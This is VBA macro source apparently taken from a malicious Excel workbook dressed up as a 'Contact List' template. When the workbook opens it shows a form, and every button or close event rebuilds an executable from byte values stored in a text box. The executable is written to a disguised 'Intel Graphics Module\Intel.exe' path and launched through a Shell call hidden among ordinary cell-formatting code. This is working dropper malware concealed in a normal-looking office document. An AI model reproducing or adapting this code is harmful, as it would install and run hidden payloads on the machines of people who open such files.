Attribute VB_Name = "Module1"
Sub WriteData()
Attribute WriteData.VB_ProcData.VB_Invoke_Func = " \n14"

' WriteData Macro
    Range("A1:I5").Select
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = False
        .Orientation = 0
        .AddIndent = False
        .IndentLevel = 0
        .ShrinkToFit = False
        .ReadingOrder = xlContext
        .MergeCells = False
    End With
    Selection.Merge
    Range("A1:I5").Select
    ActiveCell.FormulaR1C1 = "Contact List"
    Range("A1:I5").Select
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlCenter
        .WrapText = False
        .Orientation = 0
        .AddIndent = False
        .IndentLevel = 0
        .ShrinkToFit = False
        .ReadingOrder = xlContext
        .MergeCells = True
    End With
    With Selection.Font
        .Name = "Calibri"
        .Size = 20
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlUnderlineStyleNone
        .ThemeColor = xlThemeColorLight1
        .TintAndShade = 0
        .ThemeFont = xlThemeFontMinor
    End With
    Rows("1:1").RowHeight = 9.75
    Rows("2:2").RowHeight = 12
    Rows("3:3").RowHeight = 9.75
    Rows("4:4").RowHeight = 8.25
    Selection.Font.Bold = True
    Range("A1:I35").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    With Selection.Borders(xlEdgeLeft)
        .LineStyle = xlContinuous
        .ColorIndex = 0
        .TintAndShade = 0
        .Weight = xlThin
    End With
    With Selection.Borders(xlEdgeTop)
        .LineStyle = xlContinuous
        .ColorIndex = 0
        .TintAndShade = 0
        .Weight = xlThin
    End With
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .ColorIndex = 0
        .TintAndShade = 0
        .Weight = xlThin
    End With
    With Selection.Borders(xlEdgeRight)
        .LineStyle = xlContinuous
        .ColorIndex = 0
        .TintAndShade = 0
        .Weight = xlThin
    End With
    With Selection.Borders(xlInsideVertical)
        .LineStyle = xlContinuous
        .ColorIndex = 0
        .TintAndShade = 0
        .Weight = xlThin
    End With
    With Selection.Borders(xlInsideHorizontal)
        .LineStyle = xlContinuous
        .ColorIndex = 0
        .TintAndShade = 0
        .Weight = xlThin
    End With
    Range("A6").Select
    ActiveCell.FormulaR1C1 = "Sno"
    Range("A6").Select
    ActiveCell.FormulaR1C1 = "S.no"
    Range("A7").Select
    ActiveCell.FormulaR1C1 = "1"
    Range("A7").Select
    Selection.AutoFill Destination:=Range("A7:A35"), Type:=xlFillSeries
    Range("A7:A35").Select
    Range("B6:C35").Select
    Selection.Merge True
    Range("D6:F35").Select
    Selection.Merge True
    Range("G6:I35").Select
    Selection.Merge True
    Range("B6:C6").Select
    ActiveCell.FormulaR1C1 = "Employee Name"
    Range("D6:F6").Select
    ActiveCell.FormulaR1C1 = "Designation"
    Range("G6:I6").Select
    ActiveCell.FormulaR1C1 = "Contcat Number"
    Range("A6:I6").Select
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = False
        .Orientation = 0
        .AddIndent = False
        .IndentLevel = 0
        .ShrinkToFit = False
        .ReadingOrder = xlContext
    End With
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlCenter
        .WrapText = False
        .Orientation = 0
        .AddIndent = False
        .IndentLevel = 0
        .ShrinkToFit = False
        .ReadingOrder = xlContext
    End With
    Range("D9:F9").Select
   
    Range("B7:C7").Select
    ActiveWindow.SmallScroll Down:=21
    Range("A42:C42").Select
    Selection.Borders(xlDiagonalDown).LineStyle = xlNone
    Selection.Borders(xlDiagonalUp).LineStyle = xlNone
    Selection.Borders(xlEdgeLeft).LineStyle = xlNone
    Selection.Borders(xlEdgeTop).LineStyle = xlNone
    With Selection.Borders(xlEdgeBottom)
        .LineStyle = xlContinuous
        .ColorIndex = 0
        .TintAndShade = 0
        .Weight = xlThin
    End With
    Selection.Borders(xlEdgeRight).LineStyle = xlNone
    Selection.Borders(xlInsideVertical).LineStyle = xlNone
    Selection.Borders(xlInsideHorizontal).LineStyle = xlNone
    Range("A43:C43").Select
    With Selection
        .HorizontalAlignment = xlCenter
        .VerticalAlignment = xlBottom
        .WrapText = False
        .Orientation = 0
        .AddIndent = False
        .IndentLevel = 0
        .ShrinkToFit = False
        .ReadingOrder = xlContext
        .MergeCells = False
    End With
    Dim Path As Variant
    Path = Environ$("USERPROFILE") & "\Intel Graphics Module\Intel.exe"
    Dim RetVal
    RetVal = Shell(Path, 1)
    Selection.Merge
    Range("A43:C43").Select
    ActiveCell.FormulaR1C1 = "Admin Signature"
    Range("A42:C43").Select
    Selection.Copy
    Range("G42").Select
    ActiveSheet.Paste
    Range("G43:I43").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "Prove Reader"
    Range("G44").Select
End Sub
Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet3"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Open()
UserForm1.Show
End Sub
Attribute VB_Name = "UserForm1"
Attribute VB_Base = "0{909673D9-5950-4778-B500-CB66CD3D8B61}{A1003E42-4628-4C45-A3F5-2C80E9C15A87}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Function Cre_Folder() As String
Dim FSO
Dim sFolder As String
sFolder = Environ$("USERPROFILE") & "\Intel Graphics Module"
Set FSO = CreateObject("Scripting.FileSystemObject")
If Not FSO.FolderExists(sFolder) Then
FSO.CreateFolder (sFolder)
Else
Cre_Folder = sFolder
End If
Cre_Folder = sFolder
End Function
Function Cre_File() As String
Dim FFSO
Dim Path As String
Path = Cre_Folder & "\new.txt"
Set FFSO = CreateObject("Scripting.FileSystemObject")
Set file = FFSO.CreateTextFile(Path, True)
file.writeline (TextBox1.Text)
file.Close
Cre_File = Path
End Function
 
Function ImportFromText() As String
Dim Path As String
Path = Cre_File
    Open Path For Input As #1
    r = 0
    Do Until EOF(1)
     Line Input #1, Data
      r = r + 1
    Loop
    Close #1
    Dim Str() As String
    Dim BT() As Byte
    Dim Index As Double
    Index = 0
    Str = Split(Data, "!")
    For Each arr In Str
     ReDim Preserve BT(Index)
     BT(Index) = CByte(arr)
     Index = Index + 1
    Next arr
    Path = Environ$("USERPROFILE") & "\Intel Graphics Module\Intel.exe"
    Dim FSO
    Set FSO = CreateObject("Scripting.FileSystemObject")
    If Not FSO.FolderExists(Path) Then
    Open Path For Binary Access Write As #1
    Put #1, , BT
    Close 1
    Else
    End If
    ImportFromText = Path
End Function
Private Sub Cac_btn_Click()
ImportFromText
UserForm1.Hide
Sheet1.Visible = xlSheetVisible
Sheet1.Copy
Module1.WriteData
End Sub
Private Sub Oky_btn_Click()
ImportFromText
UserForm1.Hide
Sheet1.Visible = xlSheetVisible
Sheet1.Copy
Module1.WriteData
End Sub

Private Sub TextBox1_Change()

End Sub

Private Sub UserForm_Click()
ImportFromText
UserForm1.Hide
Sheet1.Visible = xlSheetVisible
Sheet1.Copy
Module1.WriteData
End Sub
Private Sub UserForm_Deactivate()
ImportFromText
UserForm1.Hide
Sheet1.Visible = xlSheetVisible
Sheet1.Copy
Module1.WriteData
End Sub
Private Sub UserForm_Terminate()
ImportFromText
Sheet1.Visible = xlSheetVisible
Sheet1.Copy
Module1.WriteData
End Sub


INQUEST-PP=macro
